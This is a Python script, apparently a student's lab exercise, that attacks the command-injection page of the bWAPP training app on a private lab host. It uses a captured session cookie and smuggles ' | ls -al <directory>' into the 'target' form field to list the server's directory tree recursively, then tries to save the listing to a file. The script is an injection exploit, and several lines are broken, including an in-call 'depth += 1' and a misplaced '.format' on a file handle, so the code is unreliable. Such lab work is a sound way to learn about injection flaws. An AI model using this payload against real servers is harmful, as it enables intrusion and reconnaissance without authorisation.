import requests
from bs4 import BeautifulSoup
import openpyxl
from openpyxl import Workbook
    
headers = {
"Referrer": "http://192.168.96.142/bWAPP/commandi.php",
"Cookie" : "PHPSESSID=4195147d4ffc993e5191b0a155f081ab; security_level=0"
}
data = {
    "target" : " | ls -al",
    "form" : "submit"    
    }


result_dir = {}


#1. 일단 html연결하고 파싱할 데이터 들고오기
def Get(directory_name):

    data['target'] = f" | ls -al {directory_name}"
    response = requests.post("http://192.168.96.142/bWAPP/commandi.php", headers=headers, data=data)
    if response.status_code == 200:
           html = response.text
    else:
        print("Error fetching HTML:", response.status_code)
    return BeautifulSoup(html, 'html.parser')
        


#2. 결과로부터 디렉토리 목록을 파싱하는 함수
def parse_directories(directory_name,depth=1):
    
    handler = Get(directory_name) 

    #해당 위치에서 디렉토리 몇개있나 출력
    dir_listing = handler.select_one('p[align="left"]')
    if dir_listing:
        split_dir = dir_listing.text.split('\n') #list
        dir={} #임시 result_dir 딕셔너리 역할
        for index,line in enumerate(split_dir) :
            
            if line.startswith('d'): #디렉토리면!!!
                parts = line.split()
                dir_name = parts[-1]
                parse_directories(dir_name,depth += 1) 

            else : #파일이면!!!
                if line.strip():  # 빈 줄이 아닌 경우에만 처리
                    parts = line.split()
                    file_name = parts[-1]
                    dir[f"depth :{depth}"] = file_name
                    
                       
    else : print("No directory listing found.")
 
    return dir
    
#3. 결과 리스트에 모두 넣기
def make_result():
    pass

def toxl(args,data): #excel name 변수.
    fd = open("{}.csv", "a").format(args)
    fd.write(data)
    fd.close()


# 메인 함수
def main():

    result_dir = parse_directories('.',depth=1)
    toxl("beebox_result", result_dir)

if __name__ == "__main__":
    main()

 